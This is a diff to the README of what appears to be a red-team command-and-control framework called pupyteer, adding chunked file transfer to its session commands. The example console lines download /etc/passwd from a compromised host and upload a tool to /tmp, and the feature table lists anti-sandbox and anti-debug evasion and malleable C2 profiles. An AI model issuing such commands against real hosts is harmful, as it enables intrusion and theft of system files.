@@ -98,13 +98,17 @@ and beacons. Then, from the console:
 
 ```
 pupyteer > sessions list                       # callbacks
-pupyteer > sessions interact <session_id>      # shell: type 'sysinfo', 'ps', 'id -u'
-pupyteer > sessions results <session_id>       # output of commands already reported
+pupyteer > sessions interact <session_id>      # shell: sysinfo, ps, fs_list /etc, id -u
+pupyteer > sessions results <session_id>       # output of commands already answered
+pupyteer > sessions download <session_id> /etc/passwd ./passwd
+pupyteer > sessions upload <session_id> ./tool /tmp/tool
 ```
 
 Commands are queued per session and delivered on the agent's next check-in, so
 output appears after up to one beacon interval. Inside `sessions interact` the
-shell waits and prints the reply; outside it, `sessions results` catches up.
+shell waits and prints the reply; if you leave early, `sessions results` catches
+up. Transfers are chunked, so a file larger than the operator's memory is not a
+problem.
 
 ---
 
@@ -147,7 +151,7 @@ PUPYTEER
 | **Transports** | Served listeners: **TCP** and **HTTP/HTTPS** (same session protocol, one JSON message per POST). Agent-side DNS/DoH/WebSocket stubs exist but have no listener, so `payloads build` rejects them rather than ship a payload that can never call back. |
 | **C2 Profiles** | YAML-based malleable C2 — heartbeat, encoding, timeouts, headers, URIs |
 | **Modules** | Core, Recon, Execution, File Ops, Red-Team, Evasion — standardized ABC |
-| **Sessions** | list/info/interact/rename/kill/tag/search, audit trail |
+| **Sessions** | list/info/interact/rename/kill/tag/search, chunked file upload & download, audit trail |
 | **Tasks** | Priority queue (CRITICAL → BACKGROUND), async execution, tracking |
 | **Evasion** | XOR/AES/RC4 obfuscation, PE manipulation, anti-sandbox/debug/VM, Litterbox integration |
 | **Security** | mTLS 1.2+, JWT, RBAC, input validation, credential redaction, session auth |
@@ -214,7 +218,7 @@ git-ignored.
 .venv/bin/python -m pytest pupyteer/tests/integration/ -v
 ```
 
-**Current test count: 746 tests passing** (`pytest pupyteer/tests`)
+**Current test count: 748 tests passing** (`pytest pupyteer/tests`)
 
 ---
 
